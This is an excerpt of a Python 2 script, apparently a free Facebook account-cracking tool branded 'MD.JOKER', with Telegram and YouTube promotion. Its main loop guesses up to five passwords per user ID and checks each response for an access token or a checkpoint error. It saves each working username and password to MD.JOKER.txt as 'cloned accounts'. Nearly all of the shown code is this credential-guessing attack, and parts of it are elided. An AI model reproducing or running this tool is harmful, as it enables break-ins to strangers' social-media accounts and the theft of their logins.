# MY TELEGRAM CHANNEL @MD.JOKER
# MY TELEGRAM GROUP @ Tar Max Komand 
#MY GITHUB HTTPS://GITHUB.COM/MD.JOKER
#THIS SCRIPT FREE 
...
MD.JOKER_youtube = random.choice(["https://youtube.com/channel/UCXjyXBDIBD_dXh0M9d8EIJA"])

youtuber = MD.JOKER_youtube
...
def telegram():
	...
	os.system("xdg-open https://t.me/MD.JOKERHickar")
...
\033[1;97m               ─────────────•◈•──────────\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : MD.JOKER
\033[1;91m GitHub      : MD.JOKER
\033[1;91m YouTube     : MD.JOKER
\033[1;91m Telegram CH   : MD.JOKER
\033[1;91m TLEGRAM GP    : MD.JOKER
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[MD.JOKER_OK] ' + k + c + user + ' | ' + pass1
                okb = open('MD.JOKER.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[MD.JOKER_CP] ' + k + c + user + ' | ' + pass1
                cps = open('MD.JOKER.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[MD.JOKER_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('MD.JOKER.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[MD.JOKER_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('MD.JOKER.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[MD.JOKER_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('MD.JOKER.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[MD.JOKER_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('MD.JOKER.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[MD.JOKER_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('MD.JOKER.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[MD.JOKER_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('MD.JOKER.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[MD.JOKER_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('MD.JOKER.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[MD.JOKER_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('MD.JOKER.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : MD.JOKER.txt'
